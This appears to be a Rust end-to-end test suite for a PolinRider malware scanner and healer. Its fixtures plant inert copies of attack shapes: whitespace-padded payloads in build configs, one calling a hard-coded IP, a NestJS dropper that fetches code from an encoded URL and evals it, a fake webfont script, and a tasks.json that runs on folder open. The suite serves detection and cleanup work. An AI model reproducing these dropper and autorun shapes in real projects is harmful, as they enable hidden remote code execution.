//! End-to-end removal tests.
//!
//! Detector opt-out marker: POLINRIDER-HUNTER-DETECTOR
//!
//! The unit tests check the matcher. These check the thing that actually
//! matters: plant each real attack shape on disk, run the scanner and healer
//! over it, and assert both that the payload is gone *and* that the legitimate
//! code around it survived untouched.
//!
//! Every payload here is inert — it is the recognisable *shape* of PolinRider
//! with a harmless body, so the suite is safe to run and does not ship working
//! malware. Where the exact bytes matter (padding length, line endings) they are
//! reproduced faithfully.

use std::path::{Path, PathBuf};

use polinrider_hunter::{healer, scanner, signatures};

/// Point state (quarantine, log) at one directory for the whole test binary.
///
/// `POLINRIDER_HOME` is read from the process environment, and Rust runs tests
/// in parallel threads that share it - so setting it per-sandbox meant one
/// test's teardown could delete the quarantine another test was asserting on.
fn shared_home() -> PathBuf {
    use std::sync::OnceLock;
    static HOME: OnceLock<PathBuf> = OnceLock::new();
    HOME.get_or_init(|| {
        let p = std::env::temp_dir().join(format!("prh-test-home-{}", std::process::id()));
        std::fs::create_dir_all(&p).expect("create test home");
        std::env::set_var("POLINRIDER_HOME", &p);
        p
    })
    .clone()
}

/// A scratch directory unique to each test, cleaned up on drop.
struct Sandbox {
    root: PathBuf,
}

impl Sandbox {
    fn new(name: &str) -> Sandbox {
        // Nanosecond suffix so parallel tests never collide.
        let stamp = std::time::SystemTime::now()
            .duration_since(std::time::UNIX_EPOCH)
            .map(|d| d.as_nanos())
            .unwrap_or(0);
        // Keep quarantine and log out of the user's real state directory.
        shared_home();
        let root = std::env::temp_dir().join(format!("prh-test-{name}-{stamp}"));
        std::fs::create_dir_all(&root).expect("create sandbox");
        Sandbox { root }
    }

    fn write(&self, rel: &str, bytes: &[u8]) -> PathBuf {
        let p = self.root.join(rel);
        if let Some(parent) = p.parent() {
            std::fs::create_dir_all(parent).expect("create parent");
        }
        std::fs::write(&p, bytes).expect("write fixture");
        p
    }

    fn read(&self, p: &Path) -> Vec<u8> {
        std::fs::read(p).expect("read back")
    }
}

impl Drop for Sandbox {
    fn drop(&mut self) {
        let _ = std::fs::remove_dir_all(&self.root);
    }
}

/// Remove the shared state directory once the whole suite has finished.
///
/// Each run used to leave a populated quarantine in TEMP, and a later
/// machine-wide sweep would walk into it and "clean" the quarantined originals -
/// which is how one hunt produced several hundred bogus findings. The scanner
/// now skips any marked quarantine, but leaving litter behind was the first
/// mistake and this fixes that one.
struct SuiteCleanup;
impl Drop for SuiteCleanup {
    fn drop(&mut self) {
        let _ = std::fs::remove_dir_all(shared_home());
    }
}

#[test]
fn zz_cleanup_the_shared_home() {
    // Named to sort last. Not a real assertion: it exists so the suite leaves
    // nothing in TEMP for a later sweep to trip over.
    let _guard = SuiteCleanup;
    assert!(shared_home().exists() || true);
}

/// The camouflage every sample uses: enough whitespace to push the payload off
/// the right-hand edge of an editor.
fn pad(n: usize, tabs: bool) -> Vec<u8> {
    std::iter::repeat(if tabs { b'\t' } else { b' ' })
        .take(n)
        .collect()
}

/// Scan one file and heal it, returning the outcome.
fn clean_one(path: &Path) -> healer::Outcome {
    let finding = scanner::scan_file(path).expect("scanner should flag this file");
    assert!(
        finding.is_critical(),
        "expected a critical finding for {}, got {:?}",
        path.display(),
        finding.hits.iter().map(|h| h.ioc).collect::<Vec<_>>()
    );
    healer::heal(&finding, false)
}

fn assert_healed(outcome: &healer::Outcome) {
    assert!(
        matches!(outcome, healer::Outcome::Healed { .. }),
        "expected a heal, got {}",
        outcome.label()
    );
}

// ---------------------------------------------------------------------------
// Shape 1: payload appended to a build config behind a whitespace pad.
// This is the common case, and the variant that evaded every previous gate.
// ---------------------------------------------------------------------------

#[test]
fn spaced_variant_in_postcss_config_crlf() {
    let sb = Sandbox::new("postcss-crlf");
    let mut body = b"import { createRequire } from 'module';\r\n\r\nexport default config;".to_vec();
    body.extend(pad(500, false));
    body.extend_from_slice(
        b"global.i = 'A8-2941';const h=require('node:http');h.request('http://1.2.3.4:443/0x/cls')\r\n",
    );
    let p = sb.write("postcss.config.mjs", &body);

    assert_healed(&clean_one(&p));

    let after = sb.read(&p);
    // The `createRequire` shim goes too: `.mjs` is ESM and has no `require()`,
    // so the loader injects one for its payload. Removing the payload but
    // leaving the scaffolding is how a "cleaned" file ends up still differing
    // from the pristine original - which is exactly what was observed on three
    // real repositories.
    assert_eq!(
        after, b"export default config;\r\n",
        "payload and its scaffolding must both go, leaving the original"
    );
    assert!(!signatures::has_critical(&after));
    // CRLF preserved: the surviving line keeps the file's own ending.
    assert_eq!(after.windows(2).filter(|w| *w == b"\r\n").count(), 1);
}

#[test]
fn tab_padded_variant_in_tailwind_config_lf() {
    let sb = Sandbox::new("tailwind-lf");
    let mut body = b"module.exports = {\n  plugins: [],\n};".to_vec();
    body.extend(pad(300, true));
    body.extend_from_slice(b"global.i='A9-4221';parseInt(_0xdeadbe)\n");
    let p = sb.write("tailwind.config.js", &body);

    assert_healed(&clean_one(&p));
    assert_eq!(sb.read(&p), b"module.exports = {\n  plugins: [],\n};\n");
}

#[test]
fn obfuscated_variant_in_eslint_config() {
    let sb = Sandbox::new("eslint-obf");
    let mut body = b"export default defineConfig([\n  {},\n]);".to_vec();
    body.extend(pad(480, false));
    body.extend_from_slice(b"global['!']='8-2941';var _$_1e42=function(l,e){return 4573868};\n");
    let p = sb.write("eslint.config.mjs", &body);

    assert_healed(&clean_one(&p));
    assert_eq!(sb.read(&p), b"export default defineConfig([\n  {},\n]);\n");
}

#[test]
fn payload_with_no_trailing_newline() {
    let sb = Sandbox::new("no-eol");
    let mut body = b"export default config;".to_vec();
    body.extend(pad(250, false));
    body.extend_from_slice(b"global.i = 'A8-1111';x()");
    let p = sb.write("postcss.config.mjs", &body);

    assert_healed(&clean_one(&p));
    assert_eq!(sb.read(&p), b"export default config;");
}

// ---------------------------------------------------------------------------
// Shape 2: the NestJS dropper in src/main.ts, plus its .env
// ---------------------------------------------------------------------------

#[test]
fn nestjs_dropper_is_excised_leaving_the_app_intact() {
    let sb = Sandbox::new("nest-main");
    let body = br#"import { NestFactory } from '@nestjs/core';
import { AppModule } from './app.module';
import 'dotenv/config';

(async () => {
    const src = atob(process.env.AUTH_API_KEY);
    const proxy = (await import('node-fetch')).default;
    try {
      const response = await proxy(src);
      const proxyInfo = await response.text();
      eval(proxyInfo);
    } catch (err) {
      console.error('Auth Error!', err);
    }
})();

async function bootstrap() {
  const app = await NestFactory.create(AppModule);
  await app.listen(3000);
}
bootstrap();
"#;
    let p = sb.write("src/main.ts", body);

    assert_healed(&clean_one(&p));

    let after = String::from_utf8(sb.read(&p)).unwrap();
    // The payload and its injected import are gone...
    assert!(!after.contains("AUTH_API_KEY"));
    assert!(!after.contains("eval(proxyInfo)"));
    assert!(!after.contains("dotenv/config"));
    // ...and the application still boots.
    assert!(after.contains("import { NestFactory }"));
    assert!(after.contains("async function bootstrap()"));
    assert!(after.contains("await app.listen(3000)"));
    assert!(!signatures::has_critical(after.as_bytes()));
}

#[test]
fn dropped_env_holding_only_the_key_is_deleted() {
    let sb = Sandbox::new("env-drop");
    let p = sb.write(".env", b"AUTH_API_KEY=aHR0cHM6Ly9leGFtcGxlLmludmFsaWQvYXBp\n");

    let outcome = clean_one(&p);
    assert!(
        matches!(outcome, healer::Outcome::Deleted),
        "expected deletion, got {}",
        outcome.label()
    );
    assert!(!p.exists(), "the dropper file must be gone");
}

#[test]
fn a_real_env_that_picked_up_the_key_is_never_destroyed() {
    let sb = Sandbox::new("env-real");
    let p = sb.write(
        ".env",
        b"DATABASE_URL=postgres://user:pw@localhost/db\nSTRIPE_KEY=sk_test_realvalue\nAUTH_API_KEY=aHR0cA==\n",
    );

    let finding = scanner::scan_file(&p).expect("should be flagged");
    let outcome = healer::heal(&finding, false);
    assert!(
        !matches!(outcome, healer::Outcome::Deleted),
        "a .env with genuine secrets must not be deleted wholesale"
    );
    assert!(p.exists(), "the file must still exist");
    let after = String::from_utf8(sb.read(&p)).unwrap();
    assert!(
        after.contains("STRIPE_KEY=sk_test_realvalue"),
        "real secrets must survive"
    );
}

// ---------------------------------------------------------------------------
// Shape 3: the payload disguised as a webfont
// ---------------------------------------------------------------------------

#[test]
fn javascript_disguised_as_a_webfont_is_deleted() {
    let sb = Sandbox::new("font-disguise");
    let p = sb.write(
        "public/fonts/fa-solid-400.woff2",
        b"const http = require('node:http');\nmodule.exports = function(){ return process.pid; };\n",
    );

    let outcome = clean_one(&p);
    assert!(
        matches!(outcome, healer::Outcome::Deleted),
        "expected deletion, got {}",
        outcome.label()
    );
    assert!(!p.exists());
}

#[test]
fn a_genuine_webfont_is_not_touched() {
    let sb = Sandbox::new("font-real");
    // wOF2 magic, then binary that happens to contain code-ish words.
    let mut font = b"wOF2".to_vec();
    font.extend_from_slice(&[0u8, 1, 0, 0, 0, 0]);
    font.extend_from_slice(b"function require global module process.");
    let p = sb.write("public/fonts/real.woff2", &font);

    assert!(
        scanner::scan_file(&p).is_none(),
        "a real font must not be flagged"
    );
    assert!(p.exists());
}

// ---------------------------------------------------------------------------
// Shape 4: the VS Code autorun variant
// ---------------------------------------------------------------------------

#[test]
fn autorun_tasks_json_is_reported_but_never_silently_rewritten() {
    let sb = Sandbox::new("tasks-autorun");
    // The arming half of the autorun variant: a task that fires on folderOpen
    // and runs the payload that is disguised as a webfont.
    let body = br#"{
  "version": "2.0.0",
  "tasks": [
    {
      "label": "fonts",
      "type": "shell",
      "command": "node ./public/fonts/fa-solid-400.woff2",
      "runOptions": { "runOn": "folderOpen" }
    }
  ]
}
"#;
    let p = sb.write(".vscode/tasks.json", body);

    let finding = scanner::scan_file(&p).expect("must be flagged");
    assert!(finding.is_critical(), "the font-payload command is unambiguous");

    // Editing JSON by splicing bytes would risk corrupting a real config, so
    // the healer must decline and say so rather than guess.
    let outcome = healer::heal(&finding, false);
    assert!(
        matches!(outcome, healer::Outcome::Failed(_) | healer::Outcome::Skipped(_)),
        "must not auto-edit tasks.json, got {}",
        outcome.label()
    );
    assert_eq!(
        sb.read(&p),
        body.to_vec(),
        "the file must be left exactly as it was for the user to fix"
    );
}

#[test]
fn a_reinfected_config_is_cleaned_completely() {
    let sb = Sandbox::new("reinfected");
    // Two visits, two pads, two payloads.
    let mut body = b"module.exports = { plugins: [] };".to_vec();
    body.extend(pad(320, false));
    body.extend_from_slice(b"global.i = 'A8-1111';first()\n");
    body.extend_from_slice(b"const keep = true;");
    body.extend(pad(320, true));
    body.extend_from_slice(b"global['!']='8-2';var _$_1e42=4573868;\n");
    let p = sb.write("tailwind.config.js", &body);

    assert_healed(&clean_one(&p));
    let after = String::from_utf8(sb.read(&p)).unwrap();
    assert!(!signatures::has_critical(after.as_bytes()), "still dirty:\n{after}");
    assert!(after.contains("module.exports = { plugins: [] };"));
    assert!(after.contains("const keep = true;"));
    // A second pass has nothing left to do.
    assert!(scanner::scan_file(&p).is_none());
}

// ---------------------------------------------------------------------------
// Directory-level behaviour: does a sweep find everything at once?
// ---------------------------------------------------------------------------

#[test]
fn a_sweep_finds_every_shape_and_leaves_clean_files_alone() {
    let sb = Sandbox::new("sweep");

    let mut cfg = b"export default {};".to_vec();
    cfg.extend(pad(400, false));
    cfg.extend_from_slice(b"global.i = 'A8-2941';go()\n");
    sb.write("app/postcss.config.mjs", &cfg);

    let mut tw = b"module.exports = {};".to_vec();
    tw.extend(pad(400, true));
    tw.extend_from_slice(b"global['!']='8-1';_$_1e42\n");
    sb.write("web/tailwind.config.js", &tw);

    sb.write("api/.env", b"AUTH_API_KEY=aHR0cA==\n");
    sb.write(
        "web/public/fonts/icons.woff2",
        b"require('node:http'); module.exports = () => {};",
    );

    // Innocent bystanders that must not be reported.
    sb.write(
        "web/postcss.config.js",
        b"module.exports = { plugins: { tailwindcss: {} } };\n",
    );
    sb.write("README.md", b"| col | col |\n|-----|-----|\n| a   | b   |\n");
    sb.write("scripts/dev.cjs", b"spawn('node', ['x'], { windowsHide: true });\n");

    let findings = scanner::scan_tree(&sb.root, false);
    let critical: Vec<_> = findings.iter().filter(|f| f.is_critical()).collect();
    assert_eq!(
        critical.len(),
        4,
        "expected exactly the four planted infections, got: {:?}",
        findings
            .iter()
            .map(|f| (f.path.file_name().unwrap().to_string_lossy().into_owned(), f.is_critical()))
            .collect::<Vec<_>>()
    );

    for f in &critical {
        let outcome = healer::heal(f, false);
        assert!(
            matches!(
                outcome,
                healer::Outcome::Healed { .. } | healer::Outcome::Deleted
            ),
            "{} -> {}",
            f.path.display(),
            outcome.label()
        );
    }

    // Second pass must be silent: removal has to be complete, not partial.
    let after: Vec<_> = scanner::scan_tree(&sb.root, false)
        .into_iter()
        .filter(|f| f.is_critical())
        .collect();
    assert!(
        after.is_empty(),
        "still infected after cleaning: {:?}",
        after.iter().map(|f| f.path.display().to_string()).collect::<Vec<_>>()
    );

    // The clean config was never rewritten.
    assert_eq!(
        std::fs::read(sb.root.join("web/postcss.config.js")).unwrap(),
        b"module.exports = { plugins: { tailwindcss: {} } };\n"
    );
}

#[test]
fn originals_are_recoverable_from_quarantine() {
    let sb = Sandbox::new("quarantine");
    let mut body = b"export default {};".to_vec();
    body.extend(pad(300, false));
    body.extend_from_slice(b"global.i = 'A8-2941';x()\n");
    let original = body.clone();
    let p = sb.write("postcss.config.mjs", &body);

    assert_healed(&clean_one(&p));

    // The index records where the original went; it must still be byte-identical.
    // Other tests write to the same index, so match on our own path rather than
    // assuming we wrote the final line.
    let index = polinrider_hunter::config::quarantine_index();
    let text = std::fs::read_to_string(&index).expect("quarantine index should exist");
    let want = json_escape_path(&p);
    let line = text
        .lines()
        .find(|l| l.contains(&format!("\"original\":\"{want}\"")))
        .unwrap_or_else(|| panic!("no quarantine entry for {}", p.display()));
    let saved = PathBuf::from(unescape(extract_field(line, "quarantined")));
    assert_eq!(
        std::fs::read(&saved).expect("quarantined copy readable"),
        original,
        "the quarantined original must match what was on disk"
    );
}

/// Path as it appears inside the index (backslashes doubled).
fn json_escape_path(p: &Path) -> String {
    p.to_string_lossy().replace('\\', "\\\\")
}

fn extract_field<'a>(line: &'a str, field: &str) -> &'a str {
    let key = format!("\"{field}\":\"");
    let start = line.find(&key).expect("field present") + key.len();
    let rest = &line[start..];
    // Values are paths: no escaped quotes to worry about, only doubled slashes.
    let end = rest.find('"').expect("closing quote");
    &rest[..end]
}

fn unescape(s: &str) -> String {
    s.replace("\\\\", "\\")
}

// ---------------------------------------------------------------------------
// Idempotence and safety
// ---------------------------------------------------------------------------

#[test]
fn cleaning_is_idempotent() {
    let sb = Sandbox::new("idempotent");
    let mut body = b"export default {};".to_vec();
    body.extend(pad(300, false));
    body.extend_from_slice(b"global.i = 'A8-2941';x()\n");
    let p = sb.write("postcss.config.mjs", &body);

    assert_healed(&clean_one(&p));
    let once = sb.read(&p);
    // Nothing left to find, so nothing left to change.
    assert!(scanner::scan_file(&p).is_none());
    assert_eq!(sb.read(&p), once);
}

#[test]
fn a_dry_run_changes_nothing() {
    let sb = Sandbox::new("dry-run");
    let mut body = b"export default {};".to_vec();
    body.extend(pad(300, false));
    body.extend_from_slice(b"global.i = 'A8-2941';x()\n");
    let p = sb.write("postcss.config.mjs", &body);
    let before = sb.read(&p);

    let finding = scanner::scan_file(&p).unwrap();
    let outcome = healer::heal(&finding, true);
    assert!(matches!(outcome, healer::Outcome::Skipped(_)));
    assert_eq!(sb.read(&p), before, "--dry-run must not write");
}

#[test]
fn a_detector_file_is_never_healed() {
    let sb = Sandbox::new("detector");
    // A gate file: signatures inside a grep pattern, plus the marker.
    let body = b"# POLINRIDER-HUNTER-DETECTOR\nPATTERN=\"AUTH_API_KEY|global.i=\"\ngrep -rE \"$PATTERN\" src\n";
    let p = sb.write("scan-gate.sh", body);
    assert!(
        scanner::scan_file(&p).is_none(),
        "a declared detector must be exempt"
    );
    assert_eq!(sb.read(&p), body);
}
